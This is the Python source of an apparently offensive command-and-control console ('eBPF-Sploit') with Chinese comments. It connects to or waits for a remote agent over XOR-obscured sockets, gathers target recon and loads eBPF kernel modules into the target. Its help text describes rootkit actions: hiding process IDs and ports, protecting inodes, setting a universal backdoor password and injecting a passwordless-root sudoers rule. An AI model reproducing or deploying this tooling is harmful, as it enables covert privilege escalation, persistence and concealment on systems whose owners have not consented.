import socket
import struct
import sys
import os
import json
import threading
import readline
from elftools.elf.elffile import ELFFile

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        GREEN = YELLOW = RED = CYAN = WHITE = RESET = ''

MAGIC = 0xDEADBEEF
PSK = "__EBPFSPLOIT_PSK__"

# ── 命令类型（与 Agent 对应）──────────────────────────────────
CMD_LOAD   = 4
CMD_UNLOAD = 5
CMD_LIST   = 6
CMD_UPDATE = 7
RESP_MSG   = 8
CMD_RECON  = 9

# ── cmd_payload 结构：4+4+4+4+32+96 = 144 bytes ──────────────
CMD_FMT  = "<IIII32s96s"
CMD_SIZE = struct.calcsize(CMD_FMT)   # 144

# ── 响应格式：uint32 长度前缀 + JSON 文本 ─────────────────────
RESP_LEN_FMT = "<I"


class EBPFSploit:
    def __init__(self, host, port):
        self.host     = host
        self.port     = port
        self.sock     = None
        self.current_mod   = None   # 当前选中的模块名（用于 use）
        self.user_configs  = {}     # 待加载时的配置
        self.active_sessions: dict = {}  # {session_id: {name, mod_name, ...}}
        self.recon_data: dict = {}        # Agent 侦察数据
        self._resp_lock = threading.Lock()
        self.state_file = ".ebpfsploit_sessions.json"
        self._load_state()

    def _load_state(self):
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    self.active_sessions = {int(k): v for k, v in data.items()}
            except Exception:
                pass

    def _save_state(self):
        try:
            with open(self.state_file, 'w') as f:
                json.dump(self.active_sessions, f)
        except Exception:
            pass

    # ── 连接 ─────────────────────────────────────────────────
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self.host:  # 正向连接：console 主动连 Agent
                print(f"{Fore.CYAN}[*] Connecting to {self.host}:{self.port}...{Fore.WHITE}")
                self.sock.connect((self.host, self.port))
            else:  # 反向监听：console 等待 Agent 回连
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind(('0.0.0.0', self.port))
                listener.listen(1)
                print(f"{Fore.CYAN}[*] Listening on 0.0.0.0:{self.port}, waiting for Agent...{Fore.WHITE}")
                self.sock, addr = listener.accept()
                listener.close()
                print(f"{Fore.CYAN}[*] Agent connected from {addr[0]}:{addr[1]}{Fore.WHITE}")
            print(f"{Fore.GREEN}[+] Agent Linked.{Fore.WHITE}")
            self._request_recon()
            self.cmd_sessions(silent=True)
        except Exception as e:
            print(f"{Fore.RED}[-] Connection failed: {e}{Fore.WHITE}")
            sys.exit(1)

    def reconnect(self):
        print(f"\n{Fore.YELLOW}[*] Connection lost! Attempting to auto-reconnect to Agent... (Ctrl+C to cancel){Fore.WHITE}")
        import time
        while True:
            try:
                time.sleep(2)
                if self.sock:
                    self.sock.close()
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if self.host:
                    self.sock.connect((self.host, self.port))
                else:
                    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    listener.bind(('0.0.0.0', self.port))
                    listener.listen(1)
                    self.sock, _ = listener.accept()
                    listener.close()
                print(f"{Fore.GREEN}[+] Reconnected to Agent successfully.{Fore.WHITE}")
                self._request_recon()
                self.cmd_sessions(silent=True)
                break
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[-] Reconnection cancelled.{Fore.WHITE}")
                sys.exit(0)
            except Exception:
                pass

    # ── XOR 加解密 ───────────────────────────────────────────
    def _xor_crypt(self, data: bytes) -> bytes:
        psk = PSK.encode()
        psk_len = len(psk)
        if psk_len == 0:
            return data
        return bytes(b ^ psk[i % psk_len] for i, b in enumerate(data))

    # ── 发送一条 cmd_payload ──────────────────────────────────
    def _send_cmd(self, cmd_type, session_id=0, data_size=0,
                  aux=b'', config=b''):
        aux_b    = aux[:32].ljust(32, b'\x00')
        config_b = config[:96].ljust(96, b'\x00')
        pkt = struct.pack(CMD_FMT, MAGIC, cmd_type, session_id,
                          data_size, aux_b, config_b)
        pkt = self._xor_crypt(pkt)
        try:
            self.sock.sendall(pkt)
        except Exception:
            self.reconnect()
            try:
                self.sock.sendall(pkt)
            except Exception:
                pass

    # ── 读取一条 length-prefix JSON 响应 ─────────────────────
    def _recv_resp(self, timeout=5.0) -> dict | None:
        self.sock.settimeout(timeout)
        try:
            raw_len = self._recvall(4)
            if not raw_len:
                self.reconnect()
                return None
            raw_len = self._xor_crypt(raw_len)
            msg_len = struct.unpack(RESP_LEN_FMT, raw_len)[0]
            if msg_len == 0 or msg_len > 65536:
                return None
            raw = self._recvall(msg_len)
            if not raw:
                self.reconnect()
                return None
            raw = self._xor_crypt(raw)
            return json.loads(raw.decode('utf-8'))
        except socket.timeout:
            return None
        except Exception:
            self.reconnect()
            return None
        finally:
            self.sock.settimeout(None)

    def _recvall(self, n: int) -> bytes | None:
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    # ── 从 ELF .metadata section 读取模块元数据 ──────────────
    def get_metadata(self, mod_name) -> dict | None:
        path = f"modules/{mod_name}.bpf.o"
        if not os.path.exists(path):
            return None
        try:
            with open(path, 'rb') as f:
                elf = ELFFile(f)
                sec = elf.get_section_by_name('.metadata')
                if sec:
                    raw = sec.data().rstrip(b'\x00').decode('utf-8')
                    return json.loads(raw)
        except Exception as e:
            print(f"{Fore.RED}[-] 解析 metadata 失败 ({mod_name}): {e}{Fore.WHITE}")
        return None

    # ── list ─────────────────────────────────────────────────
    def list_modules(self):
        if not os.path.exists('modules/'):
            os.makedirs('modules/')
            print(f"{Fore.YELLOW}[!] modules/ 目录不存在，已创建。{Fore.WHITE}")
            return
        print(f"\n{Fore.CYAN}Available Modules{Fore.WHITE}")
        print("=================")
        print(f"{'Name':<20} {'Description'}")
        print(f"{'-'*20} {'-'*45}")
        found = False
        for fn in os.listdir('modules/'):
            if fn.endswith('.bpf.o'):
                found = True
                name = fn.replace('.bpf.o', '')
                meta = self.get_metadata(name)
                desc = meta.get('desc', 'No description') if meta else 'Error reading metadata'
                # 检查可用性
                avail, missing = self.check_module_available(meta) if meta else (True, [])
                if avail:
                    status = f"{Fore.GREEN}[OK]{Fore.WHITE}"
                else:
                    reasons = ', '.join(self.REQUIRE_LABELS.get(m, m) for m in missing)
                    status = f"{Fore.RED}[N/A: {reasons}]{Fore.WHITE}"
                print(f"{name:<20} {desc}")
                print(f"{'':20} {status}")
        if not found:
            print(f"{Fore.YELLOW}  [No modules found]{Fore.WHITE}")
        print()

    # ── recon 相关 ────────────────────────────────────────────
    REQUIRE_LABELS = {
        'is_root':       '需要 root 权限',
        'tracefs':       '需要 tracefs（tracepoint 支持）',
        'probe_write':   '需要 bpf_probe_write_user 支持',
        'uprobe':        '需要 uprobe 支持',
        'kprobe':        '需要 kprobe 支持',
        'xdp':           '需要 XDP 支持（CAP_NET_ADMIN）',
        'lsm_bpf':       '需要内核 LSM BPF 支持',
        'cap_mac_admin':  '需要 CAP_MAC_ADMIN',
        'cap_net_admin':  '需要 CAP_NET_ADMIN',
    }

    def _request_recon(self):
        """连接后自动获取 Agent 环境侦察信息"""
        try:
            self._send_cmd(CMD_RECON)
            resp = self._recv_resp(timeout=5.0)
            if resp and 'recon' in resp:
                self.recon_data = resp['recon']
                self._display_recon()
            else:
                print(f"{Fore.YELLOW}[!] Agent 未返回侦察数据（旧版本？）{Fore.WHITE}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] 获取侦察数据失败: {e}{Fore.WHITE}")

    def _display_recon(self):
        r = self.recon_data
        print(f"\n{Fore.CYAN}═══  Target Recon  ═══{Fore.WHITE}")
        print(f"  Kernel    : {r.get('kernel', '?')}")
        print(f"  Arch      : {r.get('arch', '?')}")
        print(f"  Hostname  : {r.get('hostname', '?')}")
        print(f"  Root      : {'✓' if r.get('is_root') else '✗'}")

        caps = r.get('caps', {})
        cap_str = ', '.join(
            f"{'✓' if v else '✗'} {k.upper()}"
            for k, v in caps.items()
        )
        print(f"  Caps      : {cap_str}")

        feats = r.get('features', {})
        on  = [k for k, v in feats.items() if v]
        off = [k for k, v in feats.items() if not v]
        print(f"  Features  : {Fore.GREEN}{', '.join(on)}{Fore.WHITE}")
        if off:
            print(f"  Missing   : {Fore.RED}{', '.join(off)}{Fore.WHITE}")

        lsm = r.get('lsm_modules', '')
        if lsm:
            print(f"  LSM       : {lsm}")
        print()

    def check_module_available(self, meta: dict) -> tuple:
        """检查模块是否因权限/特性不足而不可用.
        返回 (available: bool, missing: list[str])"""
        if not self.recon_data or 'requires' not in meta:
            return True, []

        r = self.recon_data
        caps = r.get('caps', {})
        feats = r.get('features', {})
        missing = []

        for req in meta['requires']:
            if req == 'is_root' and not r.get('is_root'):
                missing.append(req)
            elif req.startswith('cap_'):
                cap_name = req[4:]  # e.g. 'cap_mac_admin' → 'mac_admin'
                if not caps.get(cap_name):
                    missing.append(req)
            elif req in feats and not feats[req]:
                missing.append(req)

        return len(missing) == 0, missing

    def cmd_recon(self):
        """手动请求侦察数据"""
        self._request_recon()

    # ── show options ─────────────────────────────────────────
    def show_options(self):
        if not self.current_mod:
            print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")
            return
        meta = self.get_metadata(self.current_mod)
        if not meta:
            print(f"{Fore.RED}[-] 无法读取 metadata{Fore.WHITE}")
            return
        print(f"\nModule : {self.current_mod}")
        print(f"Desc   : {meta.get('desc', 'N/A')}\n")

        opts = meta.get('options', {})
        if opts:
            print(f"{Fore.CYAN}Load-time Options (set before run){Fore.WHITE}")
            print(f"{'Option':<18} {'Current':<22} {'Description'}")
            print(f"{'-'*18} {'-'*22} {'-'*30}")
            for key, details in opts.items():
                val  = self.user_configs.get(key, details[0])
                # 转义换行符以便正常显示
                val_disp = repr(str(val))[1:-1]  # 去掉引号
                desc = details[1] if len(details) > 1 else ''
                print(f"{key:<18} {val_disp:<22} {desc}")
        else:
            print(f"{Fore.YELLOW}  [此模块无加载时配置项，使用 run 直接加载]{Fore.WHITE}")

        maps_info = meta.get('maps', {})
        if maps_info:
            print(f"\n{Fore.CYAN}Runtime-updatable Maps (update after run){Fore.WHITE}")
            print(f"{'Map Name':<22} {'Key':<10} {'Value':<10} {'Update 示例'}")
            print(f"{'-'*22} {'-'*10} {'-'*10} {'-'*30}")
            for mname, minfo in maps_info.items():
                kt = minfo.get('key_type', '?')
                vt = minfo.get('value_type', '?')
                # 生成 update 示例
                if vt == 'str':
                    example = f'update <sess> {mname} "value"'
                elif kt in ('u16',):
                    example = f'update <sess> {mname} 4444'
                elif kt in ('u64',):
                    example = f'update <sess> {mname} 123456'
                else:
                    example = f'update <sess> {mname} <key>'
                print(f"{mname:<22} {kt:<10} {vt:<10} {example}")
        print()

    # ── run_module ─────────────────────────────────────────
    def run_module(self):
        if not self.current_mod:
            print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")
            return

        mod_path = f"modules/{self.current_mod}.bpf.o"
        if not os.path.exists(mod_path):
            print(f"{Fore.RED}[-] 找不到 {mod_path}{Fore.WHITE}")
            return

        with open(mod_path, 'rb') as f:
            blob = f.read()

        # 构建初始 config（取第一个 option 的值）
        meta = self.get_metadata(self.current_mod)
        config_buf = bytearray(96)
        if meta and 'options' in meta:
            first_key = next(iter(meta['options']), None)
            if first_key:
                val = self.user_configs.get(first_key, meta['options'][first_key][0])
                val = str(val).encode('utf-8').decode('unicode_escape')  # 处理 \n → 真换行
                if val.lstrip('-').isdigit():
                    config_buf[:4] = struct.pack('<I', int(val))
                else:
                    enc = val.encode('utf-8')[:63]
                    config_buf[:len(enc)] = enc

        mod_name_b = self.current_mod.encode('utf-8')
        print(f"{Fore.CYAN}[*] Deploying {self.current_mod} → target kernel...{Fore.WHITE}")

        self._send_cmd(CMD_LOAD,
                       data_size=len(blob),
                       aux=mod_name_b,
                       config=bytes(config_buf))
        self.sock.send(self._xor_crypt(blob))

        resp = self._recv_resp(timeout=10.0)
        if resp is None:
            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
            return

        if resp.get('ok'):
            sid   = resp['session_id']
            progs = resp.get('programs', 0)
            
            # 初始化 session 的 map_state 记录
            map_state = {}
            if meta and 'maps' in meta:
                for mname in meta['maps']:
                    if mname in ('inject_payload', 'master_password'):
                        first_key = next(iter(meta.get('options', {})), None)
                        if first_key:
                            val = self.user_configs.get(first_key, meta['options'][first_key][0])
                            map_state[mname] = {"0": str(val)}

            self.active_sessions[sid] = {
                'name': self.current_mod,
                'programs': progs,
                'map_state': map_state
            }
            self._save_state()
            print(f"{Fore.GREEN}[+] Session {sid} opened  "
                  f"({progs} programs hooked){Fore.WHITE}")
        else:
            print(f"{Fore.RED}[-] 加载失败: {resp.get('error','unknown')}{Fore.WHITE}")

    # ── sessions ─────────────────────────────────────────────
    def cmd_sessions(self, silent=False):
        self._send_cmd(CMD_LIST)
        resp = self._recv_resp()
        if resp is None:
            if not silent: print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
            return

        sessions = resp.get('sessions', [])
        
        # 同步 agent 状态与本地状态
        active_ids = {s['id'] for s in sessions}
        for sid in list(self.active_sessions.keys()):
            if sid not in active_ids:
                del self.active_sessions[sid]
                
        for s in sessions:
            if s['id'] in self.active_sessions:
                self.active_sessions[s['id']]['programs'] = s.get('programs', 0)
                self.active_sessions[s['id']]['name'] = s.get('name', '?')
            else:
                self.active_sessions[s['id']] = s
                # 尝试通过通信接口从 Agent 拉取 Array Map 的关键字段补偿本地记录
                pulled = self._pull_map_state_from_agent(s['id'], s['name'])
                if pulled:
                    self.active_sessions[s['id']]['map_state'] = pulled
        self._save_state()

        if silent:
            return

        if not sessions:
            print(f"{Fore.YELLOW}  [No active sessions]{Fore.WHITE}")
            return

        print(f"\n{Fore.CYAN}Active Sessions{Fore.WHITE}")
        print("================")
        print(f"{'ID':<6} {'Module':<20} {'Programs'}")
        print(f"{'-'*6} {'-'*20} {'-'*10}")
        for sid, s in self.active_sessions.items():
            print(f"{sid:<6} {s['name']:<20} {s.get('programs', '?')}")
        print()

    def _pull_map_state_from_agent(self, sid: int, module_name: str) -> dict:
        meta = self.get_metadata(module_name)
        if not meta or 'maps' not in meta: return {}
        map_state = {}
        for mname, mdetails in meta['maps'].items():
            val_type = mdetails.get('value_type', 'u32')
            
            try:
                pkt = struct.pack(CMD_FMT, MAGIC, 11, sid, 0, mname.encode('utf-8')[:32].ljust(32, b'\x00'), b'\x00'*96)
                self.sock.sendall(self._xor_crypt(pkt))
                self.sock.settimeout(2.0)
                raw_len = self._recvall(4)
                if raw_len:
                    raw_len = self._xor_crypt(raw_len)
                    msg_len = struct.unpack(RESP_LEN_FMT, raw_len)[0]
                    raw = self._recvall(msg_len)
                    if raw:
                        raw = self._xor_crypt(raw)
                        resp = json.loads(raw.decode('utf-8'))
                        if resp.get('ok') and 'entries' in resp:
                            map_state[mname] = {}
                            for entry in resp['entries']:
                                k_bytes = bytes.fromhex(entry['k'])
                                v_bytes = bytes.fromhex(entry['v'])
                                
                                # 解析 key (通常是 u32)
                                try:
                                    k_val = str(struct.unpack("<I", k_bytes[:4])[0])
                                except Exception:
                                    k_val = entry['k']
                                    
                                # 解析 value
                                try:
                                    if val_type == 'str':
                                        parsed_v = v_bytes.split(b'\x00')[0].decode('utf-8', 'replace')
                                        if not parsed_v: continue # ignore empty strings in arrays
                                        map_state[mname][k_val] = parsed_v
                                    else:
                                        parsed_v = str(struct.unpack("<I", v_bytes[:4])[0])
                                        if parsed_v != "0": # ignore zero entries
                                            map_state[mname][k_val] = parsed_v
                                except Exception:
                                    pass
                            
                            # if array map and empty, remove it
                            if not map_state[mname]:
                                del map_state[mname]
            except Exception as e:
                pass
            finally:
                self.sock.settimeout(None)
        return map_state

    # ── unload ─────────────────────────────────────────────────
    def cmd_unload(self, session_id: int):
        self._send_cmd(CMD_UNLOAD, session_id=session_id)
        resp = self._recv_resp()
        if resp is None:
            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
            return
        if resp.get('ok'):
            name = resp.get('name', '?')
            print(f"{Fore.GREEN}[+] Session {session_id} ('{name}') unloaded.{Fore.WHITE}")
            self.active_sessions.pop(session_id, None)
            self._save_state()
        else:
            print(f"{Fore.RED}[-] 卸载失败: {resp.get('error','unknown')}{Fore.WHITE}")

    # ── update ─────────────────────────────────────────────────
    # update <session_id> <map_name> <key_arg> [value_arg]
    # 自动根据 map 的 key_size 打包 key；value 缺省为 uint32(1)
    def cmd_update(self, args: list[str]):
        if len(args) < 2:
            print("Usage: update <session_id> <map_name> <value>  (For Array maps like master_password)")
            print("       update <session_id> <map_name> <key>    (For Hash maps like hidden_pids)")
            return

        try:
            sid = int(args[0])
        except ValueError:
            print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")
            return

        map_name = args[1]

        # 从本地缓存 / 新查询获取 session 的模块名 → 读取 metadata 获取 map 信息
        sess_info = self.active_sessions.get(sid)
        key_size  = 4   # 默认 u32
        val_size  = 4
        val_type  = 'u32'

        if sess_info:
            meta = self.get_metadata(sess_info.get('name', ''))
            if meta:
                map_meta = meta.get('maps', {}).get(map_name, {})
                key_size = map_meta.get('key_size', 4)
                val_size = map_meta.get('value_size', 4)
                val_type = map_meta.get('value_type', 'u32')

        # 如果是字符串类型的 value，通常是 Array Map (如 inject_payload, master_password)
        # key 永远是 0，所有的后续参数拼起来作为 value
        if val_type == 'str':
            if len(args) < 3:
                print(f"{Fore.RED}[-] 错误：模块 {map_name} 需要一个字符串参数作为 value{Fore.WHITE}")
                return
            val_str = ' '.join(args[2:])
            # 移除两边可能多余的引号
            if val_str.startswith('"') and val_str.endswith('"'):
                val_str = val_str[1:-1]
            key_bytes = struct.pack('<I', 0)
            value_bytes = val_str.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]
        else:
            # Hash Map: key 是参数，value 默认是 1
            if len(args) < 3:
                print(f"{Fore.RED}[-] 错误：模块 {map_name} 缺少 key 参数{Fore.WHITE}")
                return
            key_arg = args[2]
            val_arg = args[3] if len(args) > 3 else None
            
            try:
                key_int = int(key_arg)
                fmt_map = {1: '<B', 2: '<H', 4: '<I', 8: '<Q'}
                key_bytes = struct.pack(fmt_map.get(key_size, '<I'), key_int)
            except ValueError:
                key_bytes = struct.pack('<I', 0)
                
            if val_arg is None:
                value_bytes = struct.pack('<I', 1)
            elif str(val_arg).lstrip('-').isdigit():
                value_bytes = struct.pack('<I', int(val_arg))
            else:
                value_bytes = val_arg.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]

        # config = key_bytes + value_bytes（填充至 96 字节）
        config_buf = bytearray(96)
        config_buf[:len(key_bytes)]                       = key_bytes
        config_buf[len(key_bytes):len(key_bytes)+len(value_bytes)] = value_bytes

        self._send_cmd(CMD_UPDATE,
                       session_id=sid,
                       aux=map_name.encode('utf-8'),
                       config=bytes(config_buf))
        resp = self._recv_resp()
        if resp is None:
            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
            return
        if resp.get('ok'):
            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新成功{Fore.WHITE}")
            
            # 本地记录更新状态，供 view session 展示
            if sess_info:
                if 'map_state' not in sess_info:
                    sess_info['map_state'] = {}
                if map_name not in sess_info['map_state']:
                    sess_info['map_state'][map_name] = {}
                
                # 保存人类可读的展示值
                if val_type == 'str':
                    disp_key = "0"
                    disp_val = val_str
                else:
                    disp_key = str(key_int) if 'key_int' in locals() else key_arg
                    if val_arg is None:
                        disp_val = "1"
                    else:
                        disp_val = str(val_arg)
                
                sess_info['map_state'][map_name][disp_key] = disp_val
                self._save_state()
        else:
            print(f"{Fore.RED}[-] 更新失败: {resp.get('error','unknown')}{Fore.WHITE}")

    # ── show session ───────────────────────────────────────────
    def cmd_show_session(self, sid_str: str):
        try:
            sid = int(sid_str)
        except ValueError:
            print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")
            return

        sess = self.active_sessions.get(sid)
        if not sess:
            print(f"{Fore.YELLOW}[!] 找不到 Session {sid}{Fore.WHITE}")
            return

        print(f"\n{Fore.CYAN}═══ Session {sid} ({sess['name']}) ═══{Fore.WHITE}")
        print(f"Programs Hooked : {sess.get('programs', 0)}")
        
        map_state = sess.get('map_state', {})
        if not map_state:
            print(f"Current Config  : {Fore.YELLOW}No runtime parameters set.{Fore.WHITE}\n")
            return

        print(f"\n{Fore.CYAN}Current Parameters (Local Record):{Fore.WHITE}")
        for mname, entries in map_state.items():
            print(f"  {Fore.GREEN}[Map: {mname}]{Fore.WHITE}")
            for k, v in entries.items():
                if isinstance(v, str) and ('\n' in v or len(v) > 20):
                    # 对长字符串（比如 inject_payload）进行友好展示
                    disp_v = repr(v)[1:-1]
                    print(f"    Key {k:<6} => \"{disp_v}\"")
                else:
                    print(f"    Key {k:<6} => {v}")
        print()

    # ── 主交互 shell ─────────────────────────────────────────
    def _setup_readline(self):
        commands = ['help', 'list', 'use', 'show', 'set', 'run',
                    'sessions', 'unload', 'update', 'recon', 'exit']
        show_subs = ['options', 'session']

        def completer(text, state):
            buf = readline.get_line_buffer().lstrip()
            parts = buf.split()
            n = len(parts)
            # 第一个词：命令补全
            if n == 0 or (n == 1 and not buf.endswith(' ')):
                matches = [c + ' ' for c in commands if c.startswith(text)]
            # 第二个词
            elif parts[0] == 'use':
                mods = [fn.replace('.bpf.o','') for fn in os.listdir('modules/') if fn.endswith('.bpf.o')] if os.path.isdir('modules/') else []
                matches = [m + ' ' for m in mods if m.startswith(text)]
            elif parts[0] == 'show':
                matches = [s + ' ' for s in show_subs if s.startswith(text)]
            elif parts[0] in ('unload', 'update') or (parts[0] == 'show' and n >= 2 and parts[1] == 'session'):
                sids = [str(s) + ' ' for s in self.active_sessions.keys()]
                matches = [s for s in sids if s.startswith(text)]
            elif parts[0] == 'update' and n >= 3:
                # 补全 map 名称
                sid = int(parts[1]) if parts[1].isdigit() else 0
                sess = self.active_sessions.get(sid)
                if sess:
                    meta = self.get_metadata(sess['name'])
                    if meta and 'maps' in meta:
                        matches = [m + ' ' for m in meta['maps'] if m.startswith(text)]
                    else:
                        matches = []
                else:
                    matches = []
            else:
                matches = []
            return matches[state] if state < len(matches) else None

        readline.set_completer(completer)
        readline.parse_and_bind('tab: complete')
        readline.set_completer_delims(' ')
        # 尝试加载历史
        self._histfile = '.ebpfsploit_history'
        try:
            readline.read_history_file(self._histfile)
        except FileNotFoundError:
            pass

    def _save_history(self):
        try:
            readline.write_history_file(self._histfile)
        except Exception:
            pass

    def shell(self):
        self._setup_readline()
        print(f"{Fore.GREEN}[*] eBPF-Sploit Ready. Type 'help' for commands.{Fore.WHITE}")
        while True:
            mod_prompt = f"({Fore.RED}{self.current_mod}{Fore.WHITE})" if self.current_mod else ""
            try:
                raw = input(f"ebpfsploit {mod_prompt} > ").strip()
                if not raw:
                    continue
                parts = raw.split()
                act   = parts[0].lower()

                if act == "help":
                    print(f"""
{Fore.CYAN}Core Commands{Fore.WHITE}
=============
  help                          显示此帮助
  list                          列出 modules/ 目录中所有可用模块
  use <module>                  选择模块
  show options                  显示当前模块的配置项及运行时 Map 说明
  set <KEY> <val>               设置加载前的配置参数
  run                           将当前模块注入到目标内核

{Fore.CYAN}Session Commands{Fore.WHITE}
================
  sessions                      查看当前所有在运行的模块会话
  show session <id>             查看某个会话当前的参数配置状态（本地记录）
  unload <session_id>           热卸载指定会话的模块（解除所有 Hook）
  update <sess> <map> <key> [val]
                                运行时更新已运行模块的 BPF Map

    {Fore.YELLOW}Hash Map（添加条目，key=要添加的项，val 默认为 1）{Fore.WHITE}
      update 1 hidden_pids 1234           隐藏 PID 1234
      update 2 hidden_ports 4444          隐藏端口 4444
      update 3 protected_inodes 123456    保护 inode

    {Fore.YELLOW}Array Map（修改值，key 自动设为 0）{Fore.WHITE}
      update 1 master_password "newpass"  修改万能密码
      update 2 inject_payload "\\nuser ALL=(ALL:ALL) NOPASSWD:ALL\\n"
                                          修改 sudoers 注入规则

{Fore.CYAN}Recon Commands{Fore.WHITE}
================
  recon                         重新获取并显示 Agent 环境侦察信息

  exit                          退出控制台
""")

                elif act == "list":
                    self.list_modules()

                elif act == "use":
                    if len(parts) < 2:
                        print(f"Usage: use <module>")
                        continue
                    name = parts[1]
                    if os.path.exists(f"modules/{name}.bpf.o"):
                        self.current_mod  = name
                        self.user_configs = {}
                        print(f"{Fore.GREEN}[*] Module '{name}' selected.{Fore.WHITE}")
                    else:
                        print(f"{Fore.RED}[-] modules/{name}.bpf.o not found{Fore.WHITE}")

                elif act == "show":
                    if len(parts) > 1 and parts[1] == "options":
                        self.show_options()
                    elif len(parts) > 2 and parts[1] == "session":
                        self.cmd_show_session(parts[2])
                    else:
                        print(f"Usage: show options  OR  show session <id>")

                elif act == "set":
                    if len(parts) < 3:
                        print(f"Usage: set <KEY> <value>")
                        continue
                    if self.current_mod:
                        k = parts[1].upper()
                        v = ' '.join(parts[2:])
                        # 去除两端引号
                        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
                            v = v[1:-1]
                        # 处理转义序列: \n → 真换行, \t → 真tab
                        v = v.encode('utf-8').decode('unicode_escape')
                        self.user_configs[k] = v
                        print(f"  {k} => {repr(v)}")
                    else:
                        print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")

                elif act == "run":
                    self.run_module()

                elif act == "sessions":
                    self.cmd_sessions()

                elif act == "unload":
                    if len(parts) < 2:
                        print("Usage: unload <session_id>")
                        continue
                    try:
                        self.cmd_unload(int(parts[1]))
                    except ValueError:
                        print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")

                elif act == "update":
                    self.cmd_update(parts[1:])

                elif act == "recon":
                    self.cmd_recon()

                elif act == "exit":
                    self._save_history()
                    print(f"{Fore.CYAN}[*] Closing session...{Fore.WHITE}")
                    break

                else:
                    print(f"{Fore.RED}[-] 未知命令: {act}. 输入 'help' 查看帮助{Fore.WHITE}")

            except EOFError:
                self._save_history()
                break
            except Exception as e:
                print(f"{Fore.RED}Console Error: {e}{Fore.WHITE}")


if __name__ == "__main__":
    if len(sys.argv) == 3:
        # python console.py <IP> <PORT>  →  正向连接 Agent
        c2 = EBPFSploit(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) == 2:
        # python console.py <PORT>       →  反向监听，等待 Agent 回连
        c2 = EBPFSploit(None, int(sys.argv[1]))
    else:
        print("Usage:")
        print(f"  python {sys.argv[0]} <IP> <PORT>   Forward: connect to Agent")
        print(f"  python {sys.argv[0]} <PORT>         Reverse: listen for Agent")
        sys.exit(1)
    c2.connect()
    c2.shell()